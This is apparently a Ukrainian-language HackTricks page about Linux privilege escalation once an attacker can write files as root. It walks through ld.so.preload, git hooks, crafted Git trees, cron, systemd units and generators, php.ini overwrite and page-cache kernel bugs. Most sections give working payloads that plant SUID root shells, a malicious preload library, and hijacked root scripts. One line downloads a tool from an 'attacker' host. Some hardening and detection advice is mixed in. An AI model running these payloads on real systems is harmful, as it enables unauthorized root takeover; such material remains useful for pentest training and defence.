# Запис довільного файла від root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` — це загальносистемний список спільних об’єктів, які динамічний компонувальник завантажує перед іншими спільними об’єктами. Режим безпечного виконання накладає додаткові обмеження на попереднє завантаження, тому шлях до бібліотеки на кшталт `/tmp/pe.so` не є універсальним прийомом для SUID-бінарних файлів.\
Якщо ви можете створити або змінити цей файл, процес, який його завантажує, завантажить зазначену бібліотеку перед іншими спільними об’єктами, що дасть змогу виконувати код у контексті цього процесу.<sup>[[12]](#references)</sup>

Наприклад: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** — це виконувані скрипти, які запускаються під час подій у репозиторії, зокрема операцій commit і merge. Якщо **привілейований скрипт або користувач** виконує ці дії, а зловмисник може **записувати у папку `.git`**, hook можна використати для **підвищення привілеїв**.<sup>[[13]](#references)</sup>

Наприклад, у git-репозиторії можна **створити скрипт** у **`.git/hooks`**, щоб він завжди виконувався під час створення нового commit:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Privileged Git tree export path traversal

Привілейований синхронізатор може не виконувати checkout, а натомість перелічувати репозиторій, вміст якого контролює зловмисник, за допомогою `git ls-tree`, читати кожен blob через `git cat-file`, об’єднувати вказаний шлях із staging-директорією та самостійно записувати файл. Це перетворюється на **довільний запис файлів із привілеями синхронізатора**, якщо синхронізатор поєднує `-c safe.directory=*` (вимикаючи захист Git для репозиторіїв, що належать іншому користувачу) з відсутністю перевірки, чи шлях призначення залишається всередині директорії. Абсолютне ім’я запису дерева змушує Python-функцію `os.path.join(stage, name)` відкинути `stage`; відносне ім’я з `../` виходить за межі директорії під час розв’язання шляху файловою системою. Оскільки застосунок матеріалізує необроблене дерево, а не просить Git виконати checkout, відхилення шляхів під час checkout не захищає кінцеву точку запису.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Шукайте такий шаблон коду в root-сервісах, таймерах, агентах розгортання, імпортерах шаблонів і завданнях резервного копіювання/відновлення:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Запис tree кодується як `<mode> SP <name> NUL <raw object ID>`. Параметр `git hash-object --literally` навмисно дозволяє дані об’єктів, які звичайний парсер або `git fsck` можуть відхилити, тож у тимчасовому clone можна створити tree з абсолютним шляхом призначення як ім’ям файла. Цей приклад створює blob cron-файла, обгортає створений tree у commit і переміщує на нього гілку; для експлуатації все одно потрібен дозвіл оновлювати репозиторій, який використовує привілейована задача, і Git-сервер, що приймає некоректний об’єкт.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Посилення захисту має охоплювати як отримання репозиторіїв, так і фінальну операцію з файловою системою:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Замініть `safe.directory=*` точним переліком репозиторіїв, яким служба має довіряти, і за можливості обробляйте репозиторії без прав root.
- Відхиляйте абсолютні імена та будь-які компоненти `.` або `..` перед матеріалізацією. Після об’єднання шляхів канонізуйте результат і перевірте, що ціль залишається в межах визначеного кореневого каталогу.
- Уникайте гонок symlink між перевіркою та відкриттям: відкривайте файл відносно дескриптора довіреного каталогу, а в Linux використовуйте `openat2()` з `RESOLVE_BENEATH` і `RESOLVE_NO_SYMLINKS` для шляхів, контрольованих зловмисником.
- Віддавайте перевагу звичайному checkout в ізольованому каталозі замість повторної реалізації checkout на основі виводу plumbing-команд. Якщо потрібно отримувати raw-об’єкти, увімкніть перевірку на стороні отримання, наприклад `receive.fsckObjects=true`; не знижуйте рівень важливості знахідок `receive.fsck.*`, пов’язаних з іменами шляхів, які потрібні для відхилення спеціально сформованих дерев.

### Розгортання привілейованої конфігурації

Деякі служби керування зберігають запланований стан системи у файлі конфігурації, а згодом розгортають його з підвищеними привілеями. Наприклад, [openmediavault зберігає конфігурацію в `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), а його [інтерфейс RPC](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) може застосовувати зміни служб. Якщо обліковий запис із нижчими привілеями може записувати цей файл або замінити його, перевірте, чи може він також запитати авторизоване розгортання та чи використовує вибраний модуль змінене поле від імені root. Для SSH-ключів облікового запису, запланованих команд і встановлення пакунків потрібні різні передумови; сама наявність файлу або доступність XML-файлу для запису не доводить жодної з них. Перевірте дозволи на файл і батьківські каталоги, групи викликувача та авторизацію RPC, встановлену версію й фактичного споживача, не редагуючи конфігурацію та не виконуючи операцію застосування під час переліку.

Файли визначень дій Fail2Ban у `/etc/fail2ban/action.d/` — ще одна межа привілейованої конфігурації. Користувач, який може записувати в цей каталог і переглядати його вміст, може замінити визначення дії або додати перевизначення, але самих дозволів на каталог недостатньо, щоб підтвердити виконання коду. Переконайтеся, що ввімкнений jail справді вибирає відповідну дію, що служба Fail2Ban виконує її з вищими привілеями, а також що відбудеться авторизоване перезавантаження чи перезапуск і відповідна подія блокування. Не пов’язаний із цим дозвіл sudo на перезапуск Fail2Ban має значення лише тоді, коли він стосується точного виклику служби й завантажується змінене визначення. [Конфігурація дій Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) описує зв’язок каталогу дій із jail; [приклад дії](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) показує, що `actionban` виконується під час блокування з правами користувача служби. Перевіряйте дозволи та ефективну конфігурацію, не змінюючи дії й не запускаючи блокування під час переліку.

Окрема межа виникає, коли ввімкнений jail Fail2Ban використовує поштову дію з даними WHOIS. Уразливість [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) стосувалася недовіреного тексту WHOIS, переданого через канал до GNU mailutils `mail`, обробка escape-послідовностей якого могла запускати команду. Користувач із нижчими привілеями, який може записувати файли, може впливати на відповідь, якщо здатен змінити конфігурацію перевизначення сервера **вибраного клієнта WHOIS**; у [whois.conf(5) Debian](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) описано один такий файл, але його шлях і використання залежать від інсталяції. Перевірте ефективні jail і дію, ідентичність служби, фактичний клієнт WHOIS і шлях до його конфігурації, реалізацію mail, можливість керування відповіддю та встановлене виправлення постачальника або бекпорт. Сам по собі доступний для запису файл конфігурації WHOIS, версія Fail2Ban або поштова дія не доводять наявності всього цього ланцюжка; під час пасивного переліку не надсилайте запити до зовнішнього сервера й не запускайте блокування.

### Створення файлів через TFTP і привілейовані хуки пакунків

Доступна служба TFTP може перетнути межу контейнера або локального користувача, якщо її **ефективні** параметри tftpd-hpa запускають її від імені root, відкривають корінь файлової системи як каталог `--secure` і вмикають `--create`. [Посібник tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) описує параметри створення файлів і користувача. Це може дати змогу створити новий файл у привілейованому каталозі конфігурації, зокрема `/etc/apt/apt.conf.d/`; наявний файл усе ще може бути захищений від заміни. [Посібник із конфігурації APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) описує команди `APT::Update::Pre-Invoke`. Запущений від імені root процес `apt update` може стати споживачем із вищими привілеями, **лише якщо** він зчитує новий файл конфігурації. Перевірте фактичні аргументи й ідентичність запущеного демона, доступність мережі та фільтрацію, політику створення файлів у цільовому каталозі, ефективну область конфігурації APT і подальший привілейований виклик. Файл за замовчуванням, доступний для запису цільовий каталог або запланована команда APT окремо не доводять наявності всього ланцюжка. Під час пасивного аналізу читайте лише обмежений обсяг локальної конфігурації та метаданих, не завантажуючи файл і не запускаючи APT.

### Файли Cron і часу

Якщо ви можете **записувати файли, пов’язані з cron, які виконує root**, зазвичай ви можете отримати виконання коду під час наступного запуску завдання. Цікавими цілями є:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Власний crontab root у `/var/spool/cron/` або `/var/spool/cron/crontabs/`
- Таймери `systemd` і служби, які вони запускають

Швидкі перевірки:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Typical abuse paths:

- **Додати нове root cron-завдання** до `/etc/crontab` або файла в `/etc/cron.d/`
- **Замінити скрипт**, який уже виконується через `run-parts`
- **Встановити backdoor у ціль наявного таймера**, змінивши скрипт або бінарний файл, який він запускає

Мінімальний приклад cron payload:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Якщо ви можете записувати лише в каталог cron, який використовується `run-parts`, натомість помістіть туди виконуваний файл:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Примітки:

- `run-parts` зазвичай ігнорує назви файлів із крапками, тому краще використовувати назви на кшталт `backup`, а не `backup.sh`.<sup>[[15]](#references)</sup>
- Деякі системи використовують таймери `systemd` замість класичного cron, але ідея зловживання та сама: **змінити те, що root виконає пізніше**.<sup>[[20]](#references)</sup>

### Файли служб і сокетів

Якщо ви можете записувати **файли юнітів `systemd`** або файли, на які вони посилаються, ви можете отримати виконання коду від імені root, перезавантаживши та перезапустивши юніт або дочекавшись, поки спрацює шлях активації служби/сокета.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Також перевірте права на запис і пошук у самому каталозі системних юнітів, зокрема ACL: користувач може створити новий юніт у `/etc/systemd/system`, навіть якщо читання вмісту каталогу або перегляд його списку заборонено. Сам цей шлях нічого не запускає. Переконайтеся, що системний менеджер завантажить новий юніт, що користувач має ефективний дозвіл root-рівня на виконання `systemctl start` або `restart` для його назви (або інший привілейований шлях активації), а служба запускається від потрібного користувача. Для зміненого на диску вже завантаженого юніта може знадобитися `daemon-reload`; нові юніти з іншими назвами завантажуються інакше. Перш ніж вважати правило перезапуску з підстановочним символом достатнім, перевірте точні аргументи та винятки sudo. Див. [шлях пошуку юнітів systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) і [семантику завантаження та перезавантаження systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Цікаві цілі:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Перевизначення drop-in у `/etc/systemd/system/<unit>.d/*.conf`
- Скрипти/бінарні файли служб, на які посилаються `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Шляхи `EnvironmentFile=`, доступні для запису, які завантажує служба root

Швидкі перевірки:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Типові шляхи зловживання:

- **Перезаписати `ExecStart=`** у юніті служби, що належить root і який ви можете змінювати
- **Додати drop-in перевизначення** зі шкідливим `ExecStart=` і спочатку очистити старий
- **Встановити бекдор у скрипт/бінарний файл**, на який уже посилається юніт
- **Перехопити службу, активовану сокетом**, змінивши відповідний файл `.service`, який запускається, коли сокет отримує з’єднання

Приклад шкідливого перевизначення:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Типовий потік активації:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Якщо ви не можете самостійно перезапустити служби, але можете редагувати unit, активований сокетом, можливо, потрібно лише **дочекатися підключення клієнта**, щоб запустити скомпрометовану службу від імені root.<sup>[[17]](#references)</sup>

### Каталоги генераторів systemd

**Генератори systemd** — це виконувані файли, які менеджер системи запускає перед завантаженням unit-файлів під час завантаження системи та перезавантаження конфігурації. Тому доступ на запис до каталогу генераторів системи (або до наявного виконуваного генератора) дає змогу безпосередньо виконувати код із правами root. Це легко пропустити під час аудиту, якщо перевіряти лише файли `*.service` і `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

Звичайний порядок пошуку: `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` і `/usr/lib/systemd/system-generators/` (у деяких дистрибутивах `/lib/systemd/system-generators/` доступний через об’єднання каталогів `/usr`). Виконуваний файл із такою самою назвою в каталозі, що стоїть раніше в списку, має пріоритет над пізнішим. Не плутайте ці **каталоги вхідних виконуваних файлів** із `/run/systemd/generator`, `/run/systemd/generator.early` і `/run/systemd/generator.late`, де міститься тимчасовий вивід генераторів — unit-файли.<sup>[[35]](#references)</sup>

Швидкі перевірки:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Щойно створеному генератору потрібно встановити біт виконання. Якщо примітив запису дає змогу керувати байтами, але не режимом доступу, націльтеся на вже виконуваний генератор: його перезапис на місці зазвичай зберігає метадані. Якщо доступний для запису сам каталог, створіть новий запис і позначте його як виконуваний.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Запуск `systemctl daemon-reload` для **system** manager потребує відповідної авторизації, але повторно запускає кожен system generator; інакше дочекайтеся привілейованого перезавантаження, операції з пакетом або перезавантаження системи. Каталоги user generator, як-от `~/.config/systemd/user-generators/`, виконуються в user manager і самі по собі **не надають root-доступу**.<sup>[[35]](#references)</sup>

Для hardening і пошуку загроз перевіряйте кожен компонент шляху та ACL, а не лише біти режиму доступу кінцевого файла; фіксуйте хеші та власника пакета для генераторів і сповіщайте про створення, перейменування, зміну вмісту чи дозволів у всіх каталогах вхідних даних system generator. Відстежувати запис важливо, оскільки одноразовий generator може видалити себе після виконання, а дерево згенерованих unit-файлів у `/run/systemd/generator*` перебудовується під час наступного перезавантаження.<sup>[[35]](#references)[[36]](#references)</sup>

### Перезаписати обмежувальний `php.ini`, який використовує привілейована PHP sandbox

Деякі спеціальні демони перевіряють наданий користувачем PHP-код, запускаючи `php` з **обмежувальним `php.ini`** (наприклад, `disable_functions=exec,system,...`). Якщо код у sandbox усе ще має **будь-який примітив запису** (наприклад, `file_put_contents`) і ви можете отримати доступ до **точного шляху до `php.ini`**, який використовує демон, то можете **перезаписати цей конфігураційний файл**, зняти обмеження, а потім надіслати другий payload, який виконається з підвищеними привілеями.<sup>[[2]](#references)</sup>

Типова послідовність:

1. Перший payload перезаписує конфігурацію sandbox.
2. Другий payload виконує код, оскільки небезпечні функції знову ввімкнені.

Мінімальний приклад (замініть шлях на той, який використовує демон):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Якщо daemon працює від root (або перевіряє шляхи, власником яких є root), другий запуск отримує контекст root. По суті, це **підвищення привілеїв через перезапис конфігурації**, коли sandboxed runtime усе ще може записувати файли.

### binfmt_misc

`binfmt_misc` надає доступ до реєстрацій у `/proc/sys/fs/binfmt_misc`; кожна реєстрація пов’язує шаблон типу файлу з інтерпретатором. Вплив на привілеї залежить від того, хто може змінювати реєстрацію та який процес згодом виконує файл, що відповідає шаблону, тож перед тим як вважати це вектором підвищення привілеїв, перевірте ці умови.<sup>[[21]](#references)</sup>

Виконуваний допоміжний файл із `CAP_DAC_OVERRIDE` може створювати окремий шлях реєстрації, якщо він приймає дані, контрольовані користувачем, і записує їх у `/proc/sys/fs/binfmt_misc/register`, навіть коли користувач не може записувати безпосередньо в цей вузол. Під час інвентаризації перевірте, як допоміжний файл обробляє вхідні дані та виконує запис, не запускаючи його. Якщо в зареєстрованому правилі використовується прапорець `C`, інтерпретатор отримує облікові дані на основі відповідного бінарного файла; тому відповідний файл SUID, власником якого є root, може запустити контрольований користувачем інтерпретатор від root. Перевірте монтування `binfmt_misc` і політику реєстрації, ефективну capability допоміжного файла, точне правило та шлях до інтерпретатора, виконуваний SUID-файл, а також те, чи не пригнічують `no_new_privs` або монтування `nosuid` перехід SUID. Самі по собі біт capability або вбудований рядок зі шляхом — лише підказка для перевірки.<sup>[[21]](#references)</sup> Умови придушення SUID див. у [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html).

### Перезапис обробників схем (наприклад, http: або https:)

Середовища робочого столу використовують MIME-асоціації та записи desktop-файлів, щоб вибрати застосунок для URI-схем; зловмисник, який може записувати у відповідні каталоги конфігурації користувача та desktop-файлів, може перенаправити ці схеми на контрольований ним launcher. Змінивши файл `$HOME/.config/mimeapps.list`, щоб вказати шкідливий файл як обробник URL HTTP і HTTPS (наприклад, `x-scheme-handler/http=evil.desktop` і `x-scheme-handler/https=evil.desktop`), можна зробити так, щоб натискання користувача запускало цей запис desktop-файла.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Виконання root скриптів/бінарних файлів, доступних для запису користувачу

Якщо привілейований процес запускає щось на кшталт `/bin/sh /home/username/.../script` (або будь-який бінарний файл у каталозі, що належить непривілейованому користувачу), це можна перехопити:<sup>[[1]](#references)</sup>

- **Виявлення виконання:** відстежуйте процеси за допомогою pspy, щоб зафіксувати, як root запускає шляхи, контрольовані користувачем.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Підтвердьте можливість запису:** переконайтеся, що цільовий файл і його каталог належать вашому користувачу та доступні йому для запису.
- **Перехопіть ціль:** створіть резервну копію оригінального бінарного файла/скрипту та розмістіть payload, який створює SUID shell (або виконує будь-яку іншу дію від root), а потім відновіть дозволи:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Запустіть привілейовану дію** (наприклад, натисніть кнопку в UI, яка запускає helper). Коли root повторно запустить перехоплений шлях, отримайте shell із підвищеними привілеями за допомогою `./rootshell -p`.

### Модифікація привілейованих бінарних файлів лише в page cache

Деякі помилки ядра не змінюють файл **на диску**. Натомість вони дають змогу змінити лише **копію в page cache** файлу, доступного для читання. Якщо ціллю може бути бінарний файл із **setuid** або інший файл, який запускається від імені **root**, під час наступного запуску можуть виконатися контрольовані зловмисником байти з пам’яті, що дасть змогу підвищити привілеї, хоча хеш файлу на диску не змінився.<sup>[[3]](#references)[[4]](#references)</sup>

Це зручно розглядати як **примітив запису у файл лише під час виконання**:<sup>[[3]](#references)</sup>

- **Диск залишається чистим**: inode і байти на диску не змінюються
- **Пам’ять змінена**: процеси, які читають або виконують дані з кешованої сторінки, отримують вміст, змінений зловмисником
- **Ефект тимчасовий**: зміни зникають після перезавантаження або витіснення з кешу

Цей примітив посідає проміжне місце між класичним **довільним записом у файл** і давнішими помилками **зловживання page cache**, як-от Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW покладався на race condition
- Dirty Pipe мав обмеження на позицію запису
- Примітив, що працює лише в page cache, може бути надійнішим, якщо вразливий шлях забезпечує прямий запис у кешовані сторінки, пов’язані з файлом

#### Типовий процес privesc

1. Отримайте примітив ядра, який дає змогу записувати у **сторінки page cache, пов’язані з файлом**
2. Використайте його проти **привілейованого бінарного файлу, доступного для читання**, або іншого файлу, який запускається від імені root
3. Запустіть файл **до** витіснення сторінки з кешу
4. Отримайте виконання коду від імені root, поки файл на диску все ще виглядає незміненим

Типові цілі з високою цінністю:

- Бінарні файли **setuid-root**
- Helper-програми, які запускають **сервіси root**
- Бінарні файли, які часто запускаються з **контейнерів, що спільно використовують ядро/page cache хоста**

#### Приклад шляху через AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) — вдалий приклад цього класу. Вразливий шлях був у Linux API криптографії для userspace (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` може переміщувати посилання на сторінки page cache з доступного для читання файлу до TX scatterlist криптографічної підсистеми
- шлях дешифрування `algif_aead` на місці повторно використовував буфери джерела й призначення
- після цього `authencesn` записував дані в область тегу призначення
- якщо ця область усе ще посилалася на сторінки файлу в page cache, запис потрапляв у **page cache цільового файлу**

Цікава тут не сама CVE, а схема:

- **передати сторінки кешу, пов’язані з файлом, до підсистеми ядра**
- змусити підсистему **вважати їх вихідним буфером для запису**
- виконати невелике контрольоване перезаписування в пам’яті

У загальнодоступному PoC використовували повторювані **записи по 4 байти**, щоб пропатчити `/usr/bin/su` в пам’яті, а потім запустити його.<sup>[[4]](#references)[[7]](#references)</sup>

#### Приклад шляху через ESP / XFRM + клон netfilter TEE

DirtyClone (CVE-2026-43503) демонструє інший варіант тієї самої схеми **запису в root лише через page cache**, але цього разу приймачем є **дешифрування IPsec ESP**, а не `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Важливий прийом — **відмивання метаданих**:

- `splice()` поміщає **сторінку page cache файлу, доступну лише для читання**, у пакет ESP-in-UDP
- початковий захист DirtyFrag позначав цей skb прапорцем `SKBFL_SHARED_FRAG`, щоб `esp_input()` **спершу створював копію, а потім виконував дешифрування**
- netfilter `TEE` дублює пакет через `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- клон зберігає **те саме фізичне посилання на сторінку page cache**, але втрачає `SKBFL_SHARED_FRAG`
- після цього `esp_input()` вважає клон безпечним і виконує дешифрування **на місці за допомогою `cbc(aes)`** над сторінкою, пов’язаною з файлом

Урок для рецензентів ширший за цю CVE: якщо захист використовує **метадані skb/сторінки**, щоб визначити, чи потрібно спершу створити копію, будь-який шлях **клонування/копіювання, що зберігає сторінку-підкладку, але втрачає метадані**, може непомітно знову відкрити можливість запису.

Типовий процес експлуатації:

1. Викличте `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, щоб отримати **`CAP_NET_ADMIN` у приватному network namespace**
2. Увімкніть loopback і встановіть правило **netfilter `TEE`** у `mangle/OUTPUT`
3. Встановіть транспортні SA XFRM ESP через `NETLINK_XFRM`
4. Закодуйте кожне цільове 4-байтове слово в полі SA `seq_hi` (трюк DirtyFrag для вибору слова)
5. Надішліть пакет ESP-in-UDP зі spliced-даними, щоб **клон TEE** потрапив у `esp_input()` і пройшов дешифрування **на місці**
6. Повторюйте, доки копія `/usr/bin/su` або іншого привілейованого виконуваного файлу в page cache не міститиме код, контрольований зловмисником

На практиці наслідки такі самі, як у прикладі з `AF_ALG`: файл на диску залишається чистим, але `execve()` використовує **змінені байти з page cache** і надає привілеї root.<sup>[[8]](#references)[[9]](#references)</sup>

Корисні перевірки на наявність цього вектора:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Короткострокове зменшення attack surface тут також залежить від шляху: оновлення до ядра з комітом `48f6a5356a33` виправляє шлях `clone`, тоді як блокування автозавантаження `xt_TEE` усуває **етап відмивання прапорця**, а блокування `esp4` / `esp6` усуває **приймач розшифрованих даних**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Виявлення та пошук

Якщо підозрюєте цей клас помилок, не покладайтеся лише на перевірки цілісності диска. Також перевірте:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Наведені нижче значення конфігурації розрізняють інтерфейс, який можна завантажити, та інтерфейс, вбудований у kernel; правила збирання crypto зіставляють `CONFIG_CRYPTO_USER_API_AEAD` з `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` можна завантажувати й вивантажувати як модуль
- `CONFIG_CRYPTO_USER_API_AEAD=y`: інтерфейс вбудовано в kernel
- бінарні файли setuid — хороші цілі, оскільки виправлення лише page cache може бути достатнім, щоб перетворити локальний доступ на root

#### Зменшення поверхні атаки для шляху `algif_aead`

Якщо вразливий інтерфейс надається завантажуваним модулем:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Якщо це скомпільовано в ядро, у деяких повідомленнях про розкриття вразливостей описано блокування шляху init за допомогою:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Цей тип mitigation варто пам’ятати й для інших kernel LPE: якщо експлуатація залежить від певного необов’язкового інтерфейсу, його вимкнення або додавання до blacklist може зірвати шлях експлуатації ще до того, як стане доступним повне оновлення kernel.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo — перехоплення скрипту, який запускається від root, у доступній для запису користувачем директорії PaperCut](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — відповіді на поширені запитання](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Повідомлення Openwall oss-security про CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Виправлення в Linux stable: crypto: algif_aead — повернення до операцій поза місцем](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — рекомендації щодо CVE-2026-31431](https://copy.fail/)
- [7] [Технічний опис від Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Репозиторій DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: аналіз і експлуатація варіанта Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Виправлення Linux: net: skb: збереження `SKBFL_SHARED_FRAG` у `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Попередній захід пом’якшення в Linux: встановлення `SKBFL_SHARED_FRAG` для UDP-пакетів, переданих через splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — сторінка посібника Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — документація Linux kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Асоціації MIME-застосунків](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Специфікація Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
